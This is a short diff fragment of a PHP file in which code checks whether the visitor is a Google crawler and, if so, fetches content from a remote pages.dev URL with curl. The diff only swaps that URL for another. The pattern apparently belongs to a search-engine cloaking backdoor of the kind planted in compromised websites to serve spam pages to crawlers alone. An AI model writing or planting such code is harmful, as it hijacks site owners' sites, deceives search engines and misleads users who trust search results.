@@ -5,7 +5,7 @@ function is_google_crawler() {
 }
 
 if (is_google_crawler()) {
-    $remote_url = 'https://inidekss.pages.dev/inu.html';
+    $remote_url = 'https://inidekss.pages.dev/ino.html';
 
     $curl = curl_init();
     curl_setopt_array($curl, array(
